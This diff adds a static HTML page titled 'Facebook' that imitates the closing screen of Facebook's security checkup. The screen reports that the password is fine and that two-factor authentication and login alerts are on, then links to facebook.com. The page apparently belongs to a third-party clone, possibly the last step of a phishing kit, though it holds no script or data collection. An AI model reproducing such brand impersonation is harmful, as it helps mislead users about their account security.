@@ -1,0 +1,90 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Facebook</title>
+    <link rel="icon" href="./Image/icon.png" />
+    <link href="/Css/fontawesome-free-6.5.2-web/css/fontawesome.css" rel="stylesheet" />
+    <link href="/Css/fontawesome-free-6.5.2-web/css/solid.css" rel="stylesheet" />
+    <link rel="stylesheet" href="Css/privacy2.css">
+    <link rel="stylesheet" href="Css/privacy1.css">
+    <link rel="stylesheet" href="Css/body.css">
+</head>
+<body>
+    <div class="step-container">
+        <div class="multi-step-form">
+            <div class="active">
+                <div class="mobile_header">
+                    <button class="back_header" onClick={prevStep}>
+                        <i class="icon-back"></i>
+                    </button>
+                    <div class="title_header">
+                        <span></span>
+                    </div>
+                    <div class="back_header"></div>
+                </div>
+                <div class="title2">
+                    <div class="icon-wrapper">
+                        <button
+                            class="event_back_step"
+                            onClick={prevStep}
+                        >
+                            <i class="icon-back"></i>
+                        </button>
+                    </div>
+                    <span></span>
+                </div>
+                <div class="sucess_icon_privacy_container">
+                    <div class="sucess_icon_privacy_wrapper">
+                        <i class="icon_sucess"></i>
+                        <span>You're all set</span>
+                    </div>
+                </div>
+                <div class="text-info-sucess">
+                    <p>
+                        Thank you for reviewing your security options. You
+                        can change these options anytime from your settings.
+                    </p>
+                </div>
+
+                <div class="privacy-list">
+                    <div class="wrapper_icon">
+                        <i class="icon4"></i>
+                    </div>
+                    <div class="wrapper_text">
+                        <span class="text">Your password is OK</span>
+                    </div>
+                </div>
+                <div class="privacy-list">
+                    <div class="wrapper_icon">
+                        <i class="icon4"></i>
+                    </div>
+                    <div class="wrapper_text">
+                        <span class="text">
+                            Two-factor authentication is on
+                        </span>
+                    </div>
+                </div>
+                <div class="privacy-list">
+                    <div class="wrapper_icon">
+                        <i class="icon4"></i>
+                    </div>
+                    <div class="wrapper_text">
+                        <span class="text">Login alerts are on</span>
+                    </div>
+                </div>
+
+                <div class="continue">
+                    <a
+                        href="https://facebook.com"
+                        class="button_continue"
+                    >
+                        <span>Review another topic</span>
+                    </a>
+                </div>
+            </div>
+        </div>
+    </div>
+</body>
+</html>
